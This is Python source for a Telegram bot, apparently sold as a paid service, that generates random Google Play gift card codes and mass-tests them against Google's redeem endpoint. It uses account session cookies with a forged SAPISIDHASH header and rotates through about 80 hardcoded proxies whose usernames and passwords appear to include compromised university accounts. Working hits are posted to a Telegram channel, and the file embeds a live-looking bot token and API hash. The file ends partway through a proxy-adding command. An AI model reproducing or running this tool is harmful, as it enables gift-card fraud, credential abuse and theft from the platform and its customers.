# ═══════════════════════════════════════════════════════════
#  DPK GIFT CHECKER BOT  —  single file
# ═══════════════════════════════════════════════════════════
from telethon import TelegramClient, events, Button
import asyncio, aiohttp, aiofiles, os, random, time, re, json, hashlib

API_ID = 23932993
API_HASH = '4337dc3f13c43f109509b4fae6dfdbaf'
BOT_TOKEN = '9227881624:AAHzQ1bSf5AbKTMBEuJ2paTH5bJf-ZV2_Yc'
ADMIN_ID = [8704932432]          # <-- yahan apni id
OWNER_ID = 8887398617

HITS_CHANNEL_ID = -1004460136408
FORCE_JOIN_CHANNEL_ID = -1004364787199
FORCE_JOIN_INVITE = "https://t.me/deepak_techMaster"

PROXY_FILE = "proxy.txt"
PREMIUM_USERS_FILE = "premium_users.txt"
BANNED_USERS_FILE = "banned_users.txt"
PS_COOKIE_FILE = "ps_cookies.txt"
GOOGLE_COOKIES = ""              # /pscookie se bhi bhar sakte ho

PLAYSTORE_WORKERS = 3
PLAYSTORE_TIMEOUT = 40
REDEEM_MAX = 2000
GIFT_LEN = 16
GIFT_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
_PS_KEYS = ("SAPISID", "__Secure-3PAPISID", "HSID", "SSID", "APISID",
            "SID", "__Secure-3PSID", "__Secure-1PSID")

DEFAULT_PROXIES = [
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-syd.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "nl-ams.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "hk-hon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "id-jak.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "md-chi.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "co-bog.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "hk1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "hk1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:songponp:neung1nakub",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "202.41.171.9:2086:3700900107896:ratchaburi79",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
]


# ── basic helpers ─────────────────────────────────────────
def get_file_lines(path):
    if not os.path.exists(path):
        return []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []


def load_premium():
    users = get_file_lines(PREMIUM_USERS_FILE)
    changed = False
    for a in ADMIN_ID + [OWNER_ID]:
        if str(a) not in users:
            users.append(str(a))
            changed = True
    if changed:
        try:
            with open(PREMIUM_USERS_FILE, "w") as f:
                f.write("\n".join(users) + "\n")
        except Exception:
            pass
    return users


def is_premium(uid):
    return str(uid) in load_premium()


def is_banned(uid):
    return str(uid) in get_file_lines(BANNED_USERS_FILE)


def is_admin(uid):
    return uid in ADMIN_ID or uid == OWNER_ID


def is_prem_or_admin(uid):
    return is_premium(uid) or is_admin(uid)


def save_premium(users):
    with open(PREMIUM_USERS_FILE, "w") as f:
        f.write("\n".join(users) + "\n")


bot = TelegramClient("srkbot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)


# ── proxy helpers ─────────────────────────────────────────
_PROXY_RE = re.compile(
    r'^(?:(?P<scheme>https?)://)?'
    r'(?:(?P<user>[^:@/\s]+):(?P<pw>[^@/\s]+)@)?'
    r'(?P<host>[^:@/\s]+):(?P<port>\d+)$'
)


def proxy_parts(p):
    if not p:
        return None
    m = _PROXY_RE.match(p.strip())
    return (m.group("host"), m.group("port"), m.group("user"), m.group("pw")) if m else None


def proxy_flat(p):
    x = proxy_parts(p)
    if not x:
        return None
    h, port, u, pw = x
    return f"{h}:{port}:{u}:{pw}" if (u and pw) else f"{h}:{port}"


def proxy_url(p):
    x = proxy_parts(p)
    if not x:
        return None
    h, port, u, pw = x
    return f"http://{u}:{pw}@{h}:{port}" if (u and pw) else f"http://{h}:{port}"


def sync_proxy_file():
    try:
        raw = get_file_lines(PROXY_FILE) or list(DEFAULT_PROXIES)
        seen, out = set(), []
        for p in raw:
            f = proxy_flat(p)
            if not f or f in seen:
                continue
            seen.add(f)
            out.append(f)
        if out:
            with open(PROXY_FILE, "w") as fh:
                fh.write("\n".join(out) + "\n")
            print(f"proxy pool: {len(out)}")
    except Exception as e:
        print(f"proxy sync err: {e}")


sync_proxy_file()

_session = None


async def get_session():
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(limit=200, ssl=False, enable_cleanup_closed=True)
        _session = aiohttp.ClientSession(connector=conn,
                                        timeout=aiohttp.ClientTimeout(total=90))
    return _session


async def live_proxies(limit=20, sample_n=25):
    pool = [p for p in (proxy_flat(x) for x in get_file_lines(PROXY_FILE)) if p]
    if not pool:
        pool = list(DEFAULT_PROXIES)
    if not pool:
        return []
    pick = random.sample(pool, min(sample_n, len(pool)))
    s = await get_session()
    ok = []

    async def t(p):
        try:
            async with s.get("https://play.google.com/store/giftcards", proxy=proxy_url(p),
                             ssl=False, timeout=aiohttp.ClientTimeout(total=12),
                             allow_redirects=False) as r:
                return p if r.status in (200, 301, 302, 303, 307) else None
        except Exception:
            return None

    for r in await asyncio.gather(*[t(p) for p in pick]):
        if r:
            ok.append(r)
    return (ok or pick)[:limit]


# ── cookies ───────────────────────────────────────────────
def ps_cookies():
    if GOOGLE_COOKIES.strip():
        return GOOGLE_COOKIES.strip()
    try:
        if os.path.exists(PS_COOKIE_FILE):
            with open(PS_COOKIE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                return f.read().strip()
    except Exception:
        pass
    return ""


def _ck():
    d = {}
    for part in (ps_cookies() or "").split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            d[k.strip()] = v.strip()
    return d


def _ps_headers():
    c = _ck()
    sap = c.get("SAPISID") or c.get("__Secure-3PAPISID") or ""
    h = {
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://play.google.com",
        "Referer": "https://play.google.com/store/giftcards",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "X-Same-Domain": "1",
        "Cookie": ps_cookies(),
    }
    if sap:
        ts = int(time.time())
        h["Authorization"] = "SAPISIDHASH %d_%s" % (
            ts, hashlib.sha1(f"{ts} {sap} https://play.google.com".encode()).hexdigest())
    return h


# ── gift code gen ─────────────────────────────────────────
def gen_gift_codes(count, prefix=""):
    prefix = re.sub(r'[^A-Z0-9]', '', (prefix or "").upper())[:10]
    need = max(0, GIFT_LEN - len(prefix))
    out, seen = [], set()
    while len(out) < count:
        code = prefix + "".join(random.choices(GIFT_ALPHABET, k=need))
        if code in seen:
            continue
        seen.add(code)
        out.append("-".join(code[i:i + 4] for i in range(0, GIFT_LEN, 4)))
    return out


# ── checker ───────────────────────────────────────────────
def _verdict(body, final_url):
    if "accounts.google.com" in final_url and "redeem" not in final_url:
        return "ERROR", "Cookies expired"
    b = body.lower()
    if any(k in b for k in ("already been redeemed", "already redeemed", "already used", "was redeemed")):
        return "USED", "Already redeemed"
    if any(k in b for k in ("couldn't find", "could not find", "isn't valid", "not valid",
                            "didn't work", "did not work", "invalid code", "code is invalid")):
        return "INVALID", "Code not found"
    if any(k in b for k in ("added to your balance", "has been added", "your balance",
                            "balance is now", "redeemed successfully", "was added")):
        return "CLEAN", "Live (try only)"
    return "UNKNOWN", body[:80].replace("\n", " ")


async def _gift_google(code, proxy):
    s = await get_session()
    raw = code.replace("-", "")
    kw = {"headers": _ps_headers(),
          "timeout": aiohttp.ClientTimeout(total=PLAYSTORE_TIMEOUT),
          "ssl": False, "allow_redirects": True}
    if proxy:
        kw["proxy"] = proxy_url(proxy)
    try:
        async with s.post("https://play.google.com/store/giftcards/redeem?pli=1",
                          data={"code": raw, "pli": "1"}, **kw) as r:
            return _verdict(await r.text(), str(r.url))
    except Exception:
        pass
    async with s.get(f"https://play.google.com/store/giftcards/redeem?code={raw}", **kw) as r:
        return _verdict(await r.text(), str(r.url))


async def check_gift_code(code, proxies=None):
    if not ps_cookies():
        raw = code.replace("-", "")
        ok = len(raw) == GIFT_LEN and all(ch in GIFT_ALPHABET for ch in raw)
        return {"code": code, "status": "FORMAT" if ok else "INVALID",
                "message": "Format OK (cookies nahi)" if ok else "Bad format"}
    last = None
    for _ in range(3):
        proxy = random.choice(proxies) if proxies else None
        try:
            st, msg = await _gift_google(code, proxy)
        except asyncio.TimeoutError:
            st, msg = "ERROR", "Timeout"
        except Exception as e:
            st, msg = "ERROR", str(e)[:70]
        if st in ("CLEAN", "USED", "INVALID"):
            return {"code": code, "status": st, "message": msg}
        last = {"code": code, "status": st, "message": msg}
        await asyncio.sleep(1.2)
    return last


# ── hit channel ───────────────────────────────────────────
async def send_hit_channel(code, msg, user_id, username):
    if not HITS_CHANNEL_ID:
        return
    try:
        await bot.send_message(abs(HITS_CHANNEL_ID), (
            "🔥 <b>LIVE GIFT CODE</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🎟 <code>{code}</code>\n"
            f"💬 <code>{msg[:60]}</code>\n"
            f"👤 <a href='tg://user?id={user_id}'>{username}</a>"
        ), parse_mode="html")
    except Exception:
        pass


# ── stage ─────────────────────────────────────────────────
async def run_gift_stage(user_id, username, codes):
    codes = list(dict.fromkeys(codes))
    total = len(codes)
    if not total:
        return
    mode = "cookie" if ps_cookies() else "format"

    if mode == "format":
        await bot.send_message(user_id, "⚠️ Cookies nahi hain — sirf format check hoga.\nCookies: /pscookie")

    st_msg = await bot.send_message(user_id, (
        f"🛒 Play Store Try\n🎟 Codes: <code>{total}</code>\n🔧 <b>{mode}</b>\n\n⏳ Proxy test..."
    ), parse_mode="html")

    proxies = await live_proxies(25) if mode != "format" else []
    q = asyncio.Queue()
    for c in codes:
        q.put_nowait(c)

    res = {"clean": [], "used": [], "invalid": [], "error": []}
    lock, done, started = asyncio.Lock(), [0], time.time()

    async def worker():
        while True:
            try:
                code = q.get_nowait()
            except asyncio.QueueEmpty:
                return
            r = await check_gift_code(code, proxies)
            async with lock:
                done[0] += 1
                res.get(r["status"].lower(), res["error"]).append(r)
            if r["status"] == "CLEAN":
                await send_hit_channel(r["code"], r["message"], user_id, username)
            try:
                q.task_done()
            except Exception:
                pass

    async def progress():
        await asyncio.sleep(4)
        while done[0] < total:
            el = int(time.time() - started) or 1
            pct = int(done[0] / total * 100)
            f = int(pct / 100 * 16)
            try:
                await st_msg.edit((
                    f"🛒 In progress...\n"
                    f"✅ Live: <code>{len(res['clean'])}</code>\n"
                    f"♻️ Used: <code>{len(res['used'])}</code>\n"
                    f"❌ Invalid: <code>{len(res['invalid'])}</code>\n"
                    f"🛑 Error: <code>{len(res['error'])}</code>\n\n"
                    f"📊 <code>{done[0]}/{total}</code> ({pct}%) 🚀 {done[0]/el*60:.1f}/min\n\n"
                    f"<b>{'▓'*f + '░'*(16-f)}</b> {pct}%"
                ), parse_mode="html")
            except Exception:
                pass
            await asyncio.sleep(6)

    pr = asyncio.create_task(progress())
    await asyncio.gather(*[asyncio.create_task(worker())
                           for _ in range(PLAYSTORE_WORKERS)], return_exceptions=True)
    try:
        pr.cancel()
    except Exception:
        pass

    stamp = int(time.time())
    for key, title in (("clean", "LIVE"), ("used", "USED")):
        if not res[key]:
            continue
        fn = f"{key}_{user_id}_{stamp}.txt"
        async with aiofiles.open(fn, "w", encoding="utf-8") as f:
            for r in res[key]:
                await f.write(f"{r['code']} | {r['message']}\n")
        try:
            await bot.send_file(user_id, fn, caption=f"<b>{title}</b> — {len(res[key])}",
                                parse_mode="html")
        finally:
            try:
                os.remove(fn)
            except Exception:
                pass

    summary = (f"🛒 Play Store Try Completed\n━━━━━━━━━━━━━━━━━━\n"
               f"✅ Live: <code>{len(res['clean'])}</code>\n"
               f"♻️ Used: <code>{len(res['used'])}</code>\n"
               f"❌ Invalid: <code>{len(res['invalid'])}</code>\n"
               f"🛑 Error: <code>{len(res['error'])}</code>\n"
               f"🎟 Total: <code>{total}</code> | 🔧 <b>{mode}</b>\n\n"
               f"⚠️ Try hai, redeem confirm nahi.")
    try:
        await st_msg.edit(summary, parse_mode="html")
    except Exception:
        await bot.send_message(user_id, summary, parse_mode="html")


# ── force join ────────────────────────────────────────────
async def is_member(uid):
    try:
        from telethon.tl.functions.channels import GetParticipantRequest
        await bot(GetParticipantRequest(channel=FORCE_JOIN_CHANNEL_ID, participant=uid))
        return True
    except Exception as e:
        err = str(e).lower()
        if "not a member" in err or "not participant" in err or "user not found" in err:
            return False
        return True


async def ask_join(event):
    try:
        await event.reply(
            "⚠️ <b>Join Required</b>\n\nPehle channel join karo, phir Verify dabao.",
            buttons=[[Button.url("📢 Join", FORCE_JOIN_INVITE)],
                     [Button.inline("✅ Verify", b"verify")]], parse_mode="html")
    except Exception:
        pass


# ── menus ─────────────────────────────────────────────────
def menu(uid):
    b = [
        [Button.inline("📋 Cmds", b"cmds"), Button.inline("🛠 Tools", b"tools")],
        [Button.inline("💎 Plans", b"plans"), Button.inline("👤 Profile", b"profile")],
    ]
    if is_admin(uid):
        b.append([Button.inline("⚙️ Admin", b"admin")])
    return b


@bot.on(events.NewMessage(pattern=r'^/start$'))
async def start(event):
    uid = event.sender_id
    if not is_admin(uid) and not await is_member(uid):
        await ask_join(event)
        return
    plan = "Premium ✅" if is_premium(uid) else "Free 🆓"
    await event.reply(
        "🎟 <b>SRK GIFT CHECKER</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <a href='tg://user?id={uid}'>{uid}</a> — {plan}\n\n"
        "〔🔥〕 Tap an option below.\n\n"
        "✦ Dev ~ Eroxx",
        buttons=menu(uid), parse_mode="html")


@bot.on(events.CallbackQuery(data=b"verify"))
async def verify(event):
    if await is_member(event.sender_id):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
    else:
        await event.answer("❌ Pehle join karo.", alert=True)


@bot.on(events.CallbackQuery(data=b"cmds"))
async def cmds(event):
    await event.edit(
        "📋 <b>Commands</b>\n━━━━━━━━━━━━━━━━━━\n"
        "🎟 <code>/redeem 500</code> — codes banao + auto try\n"
        "🎟 <code>/redeem 500 ABC</code> — prefix ke sath\n"
        "🔍 <code>/ps CODE</code> — ek code check\n"
        "📄 <code>/pst</code> — .txt reply, mass try\n"
        "🍪 <code>/pscookie</code> — cookies set/status\n"
        "🔎 <code>/pscheck</code> — cookies+proxy health\n"
        "🔌 <code>/fixproxy</code> — proxy file reset",
        buttons=[[Button.inline("⬅️ Back", b"main")]], parse_mode="html")


@bot.on(events.CallbackQuery(data=b"main"))
async def main_menu(event):
    uid = event.sender_id
    plan = "Premium ✅" if is_premium(uid) else "Free 🆓"
    await event.edit(
        f"🎟 <b>SRK GIFT CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <a href='tg://user?id={uid}'>{uid}</a> — {plan}",
        buttons=menu(uid), parse_mode="html")


@bot.on(events.CallbackQuery(data=b"tools"))
async def tools(event):
    await event.edit(
        "🛠 <b>Tools</b>\n━━━━━━━━━━━━━━━━━━\n"
        "🎟 <code>/redeem N</code>\n🔍 <code>/ps CODE</code>\n"
        "📄 <code>/pst</code>\n🍪 <code>/pscookie</code>\n🔎 <code>/pscheck</code>",
        buttons=[[Button.inline("⬅️ Back", b"main")]], parse_mode="html")


@bot.on(events.CallbackQuery(data=b"profile"))
async def profile(event):
    uid = event.sender_id
    plan = "Premium ✅" if is_premium(uid) else "Free 🆓"
    px = len(get_file_lines(PROXY_FILE))
    await event.edit(
        f"👤 <b>Profile</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <code>{uid}</code>\n💎 {plan}\n"
        f"🍪 Cookies: {'✅' if ps_cookies() else '❌'}\n🔌 Proxies: <code>{px}</code>",
        buttons=[[Button.inline("⬅️ Back", b"main")]], parse_mode="html")


@bot.on(events.CallbackQuery(data=b"plans"))
async def plans(event):
    await event.edit(
        "💳 <b>Plans</b>\n━━━━━━━━━━━━━━━━━━\n"
        "🛠 Core — $5 / 7 din\n⭐ Elite — $7 / 15 din\n👑 Root — $10 / 30 din\n\n"
        "Contact dev: @newxsrk",
        buttons=[[Button.inline("⬅️ Back", b"main")]], parse_mode="html")


@bot.on(events.CallbackQuery(data=b"admin"))
async def admin_panel(event):
    if not is_admin(event.sender_id):
        return
    await event.edit(
        "⚙️ <b>Admin</b>\n━━━━━━━━━━━━━━━━━━\n"
        "<code>/addpremium ID</code>\n<code>/removepremium ID</code>\n"
        "<code>/listpremium</code>\n<code>/stats</code>\n"
        "<code>/addproxy px</code>\n<code>/myproxies</code>\n"
        "<code>/clearproxy</code>",
        buttons=[[Button.inline("⬅️ Back", b"main")]], parse_mode="html")


# ── user commands ─────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/redeem\s+\d'))
async def redeem(event):
    uid = event.sender_id
    if is_banned(uid):
        return
    if not is_prem_or_admin(uid):
        await event.reply("❌ Access Denied — premium only.")
        return
    try:
        s = await event.get_sender()
        uname = s.username or f"user_{uid}"
    except Exception:
        uname = f"user_{uid}"

    raw = (event.message.text or "").split()
    count = int(raw[1])
    if count < 1:
        return
    if count > REDEEM_MAX:
        await event.reply(f"⚠️ Max {REDEEM_MAX}.")
        return

    codes = gen_gift_codes(count, raw[2] if len(raw) > 2 else "")
    stamp = int(time.time())
    fn = f"gift_{uid}_{count}_{stamp}.txt"
    async with aiofiles.open(fn, "w", encoding="utf-8") as f:
        await f.write("\n".join(codes) + "\n")
    try:
        await bot.send_file(event.chat_id, fn, caption=(
            f"🎟 <b>{count} Play Gift Codes</b> (16 char)\n"
            f"🔤 Prefix: <code>{raw[2] if len(raw) > 2 else 'Random'}</code>\n\n"
            f"⏳ Auto try start..."), parse_mode="html")
    except Exception as e:
        await event.reply(f"❌ {e}")
        try:
            os.remove(fn)
        except Exception:
            pass
        return

    try:
        async with aiofiles.open(fn, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
    finally:
        try:
            os.remove(fn)
        except Exception:
            pass
    codes = [l.split("|")[0].strip() for l in content.splitlines() if l.strip()]
    asyncio.create_task(run_gift_stage(uid, uname, codes))


@bot.on(events.NewMessage(pattern=r'/ps\s+'))
async def ps_single(event):
    if not is_prem_or_admin(event.sender_id):
        return
    code = event.message.text.split(" ", 1)[1].strip()
    proxies = await live_proxies(8) if ps_cookies() else []
    m = await event.reply(f"🛒 Checking <code>{code}</code>...", parse_mode="html")
    r = await check_gift_code(code, proxies)
    head = {"CLEAN": "✅ LIVE (try)", "USED": "♻️ USED", "INVALID": "❌ INVALID",
            "FORMAT": "🟡 FORMAT OK"}.get(r["status"], "🛑 ERROR")
    try:
        await m.edit(f"{head}\n🎟 <code>{r['code']}</code>\n💬 <code>{r['message'][:140]}</code>",
                     parse_mode="html")
    except Exception:
        pass


@bot.on(events.NewMessage(pattern=r'^/pst$'))
async def ps_mass(event):
    uid = event.sender_id
    if not is_prem_or_admin(uid):
        return
    if not event.reply_to_msg_id:
        await event.reply("❌ Reply to .txt with /pst")
        return
    msg = await event.get_reply_message()
    if not msg or not msg.file or not str(msg.file.name).endswith(".txt"):
        await event.reply("❌ Sirf .txt file!")
        return
    try:
        s = await event.get_sender()
        uname = s.username or f"user_{uid}"
    except Exception:
        uname = f"user_{uid}"
    path = await msg.download_media()
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
    finally:
        try:
            os.remove(path)
        except Exception:
            pass
    codes = list(dict.fromkeys(l.split("|")[0].strip() for l in content.splitlines() if l.strip()))
    if not codes:
        await event.reply("❌ Koi code nahi mila.")
        return
    asyncio.create_task(run_gift_stage(uid, uname, codes))


@bot.on(events.NewMessage(pattern=r'^/pscookie(?:\s|$)'))
async def pscookie(event):
    if not is_admin(event.sender_id):
        return
    parts = (event.message.text or "").split(None, 1)
    raw = parts[1].strip() if len(parts) > 1 else ""
    if not raw and event.reply_to_msg_id:
        m = await event.get_reply_message()
        raw = (m.raw_text or "").strip() if m else ""

    if raw.lower() in ("off", "clear", "reset"):
        try:
            os.remove(PS_COOKIE_FILE)
        except Exception:
            pass
        await event.reply("🗑 Cookies deleted.")
        return

    if not raw:
        c = ps_cookies()
        if not c:
            await event.reply("❌ Cookies set nahi.\nPlay Store login → F12 → Console → script → "
                              "<code>/pscookie SAPISID=...; HSID=...</code>", parse_mode="html")
            return
        await event.reply(f"🍪 Set ✅ | Lᴇɴ <code>{len(c)}</code>", parse_mode="html")
        return

    pairs = {}
    for part in raw.replace("\n", ";").split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            k, v = k.strip(), v.strip()
            if k in _PS_KEYS and v:
                pairs[k] = v
    if not any(k in pairs for k in ("SAPISID", "__Secure-3PAPISID")):
        await event.reply("❌ SAPISID nahi mila — poora string bhejo.")
        return

    with open(PS_COOKIE_FILE, "w", encoding="utf-8") as f:
        f.write("; ".join(f"{k}={v}" for k, v in pairs.items()))

    m = await event.reply("🔄 Test run...")
    ps = await live_proxies(3)
    r = await check_gift_code("AAAA-BBBB-CCCC-DDDD", ps)
    v = ("❌ expired/galat — dobara nikaalo" if "expired" in r["message"].lower()
         else "✅ Cookies live" if r["status"] in ("INVALID", "USED", "CLEAN", "UNKNOWN")
         else f"⚠️ {r['status']}")
    try:
        await m.edit(f"{v}\n🔑 {', '.join(pairs.keys())}\n🔌 proxy {len(ps)}")
    except Exception:
        pass


@bot.on(events.NewMessage(pattern=r'^/pscheck$'))
async def pscheck(event):
    if not is_admin(event.sender_id):
        return
    if not ps_cookies():
        await event.reply("❌ Cookies nahi. /pscookie se daalo.")
        return
    ps = await live_proxies(5)
    r = await check_gift_code("AAAA-BBBB-CCCC-DDDD", ps)
    ok = "expired" not in r["message"].lower()
    await event.reply(
        f"🔎 PSCHECK\n🍪 {'✅ live' if ok else '❌ expired'}\n"
        f"🔌 live proxy: <code>{len(ps)}</code>\n"
        f"📄 <code>{r['status']}</code> — <code>{r['message'][:70]}</code>",
        parse_mode="html")


# ── admin commands ────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/addpremium\s+(\d+)'))
async def addprem(event):
    if not is_admin(event.sender_id):
        return
    uid = int(event.pattern_match.group(1))
    users = load_premium()
    if str(uid) in users:
        await event.reply("⚠️ Pehle se premium hai.")
        return
    users.append(str(uid))
    save_premium(users)
    await event.reply(f"✅ Premium added: <code>{uid}</code>", parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/removepremium\s+(\d+)'))
async def delprem(event):
    if not is_admin(event.sender_id):
        return
    uid = str(int(event.pattern_match.group(1)))
    users = load_premium()
    if uid not in users:
        await event.reply("⚠️ Premium nahi hai.")
        return
    users.remove(uid)
    save_premium(users)
    await event.reply(f"✅ Removed: <code>{uid}</code>", parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/listpremium$'))
async def listprem(event):
    if not is_admin(event.sender_id):
        return
    users = load_premium()
    txt = "\n".join(f"{i+1}. <code>{u}</code>" for i, u in enumerate(users[:60]))
    await event.reply(f"💎 <b>Premium ({len(users)})</b>\n{txt}", parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/stats$'))
async def stats(event):
    if not is_admin(event.sender_id):
        return
    await event.reply(
        f"📊 <b>Stats</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"👥 Premium: <code>{len(load_premium())}</code>\n"
        f"🔌 Proxies: <code>{len(get_file_lines(PROXY_FILE))}</code>\n"
        f"🍪 Cookies: {'✅' if ps_cookies() else '❌'}\n"
        f"🎟 Max per run: <code>{REDEEM_MAX}</code>\n"
        f"⚙️ Workers: <code>{PLAYSTORE_WORKERS}</code>", parse_mode="html")


@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|$)'))
async def addproxy(event):
    if not is_admin(event.sender_id):
        return
    parts = (event.message.text or "").split(None, 1)
    raw = parts[1] if len(parts) > 1 else ""
    items = [x for x in re.split(r'[\s,]+', raw) if x]
